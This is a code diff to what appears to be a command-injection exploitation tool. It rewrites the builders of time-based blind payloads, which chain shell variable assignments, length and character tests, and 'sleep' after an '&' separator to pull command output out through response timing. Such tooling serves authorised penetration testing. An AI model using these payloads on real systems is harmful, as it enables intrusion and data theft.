@@ -92,8 +92,11 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
                  "sleep $((" + str(timesec) + "*(" + str(output_length) + "==$" + settings.RANDOM_VAR_GENERATOR + "1)))"
                  )
     elif separator == "&":
+      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
+      # would bring in an operator the separator under test is not the one for.
       payload = (separator +
-                 "[ " + str(output_length) + " -eq " + _length_expr(TAG) + " ]" + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=" + settings.CMD_SUB_PREFIX + "echo " + TAG + settings.CMD_SUB_SUFFIX + "&&" +
+                 "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                  )
     elif separator == "&&" :
@@ -117,7 +120,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -167,7 +170,7 @@ def decision_alter_interpreter(separator, TAG, output_length, timesec, http_requ
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   payload = checks.sanitize_payload_newlines(payload)
 
@@ -205,7 +208,7 @@ def condition_check(separator, condition, timesec, http_request_method):
   else:
     return None
 
-  payload = checks.append_custom_marker(payload, separator)
+  payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -240,8 +243,11 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
                 )
 
     elif separator == "&":
+      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
+      # would bring in an operator the separator under test is not the one for.
       payload = (separator +
-                 "[ " + str(output_length) + " -eq " + _length_expr(word) + " ]" + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                 "[ " + str(output_length) + " -eq ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                 )
 
@@ -265,7 +271,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -315,7 +321,7 @@ def cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -340,8 +346,11 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
                 )
 
     elif separator == "&":
+      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
+      # would bring in an operator the separator under test is not the one for.
       payload = (separator +
-                 "[ " + str(candidate_length) + " -le " + _length_expr(word) + " ]" + "&&" +
+                 settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                 "[ " + str(candidate_length) + " -le ${#" + settings.RANDOM_VAR_GENERATOR + "} ]" + "&&" +
                  "sleep " + str(timesec)
                 )
 
@@ -364,7 +373,7 @@ def get_length(separator, cmd, candidate_length, timesec, http_request_method):
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -407,7 +416,7 @@ def get_length_alter_interpreter(separator, cmd, candidate_length, timesec, http
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
@@ -447,8 +456,13 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
                 )
 
     elif separator == "&":
+      # The "&&" this payload already carries can hold a variable, where a pipe into "wc"
+      # would bring in an operator the separator under test is not the one for.
       payload = (separator +
-                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + ordinal_expr + " ]" + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=\"" + word + "\"" + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "#" + qmarks + "}\"" + "&&" +
+                settings.RANDOM_VAR_GENERATOR + "=\"${" + settings.RANDOM_VAR_GENERATOR + "%\"${" + settings.RANDOM_VAR_GENERATOR + "#?}\"}\"" + "&&" +
+                "[ " + str(ascii_char) + settings.SINGLE_WHITESPACE + operator + settings.SINGLE_WHITESPACE + var_ordinal_expr + " ]" + "&&" +
                 "sleep " + str(timesec)
                 )
 
@@ -474,7 +488,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -526,7 +540,7 @@ def get_char_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timesec
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   payload = checks.sanitize_payload_newlines(payload)
 
@@ -574,7 +588,7 @@ def fp_result_alter_interpreter(separator, cmd, num_of_chars, ascii_char, timese
     else:
       pass
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return checks.sanitize_payload_newlines(payload)
 
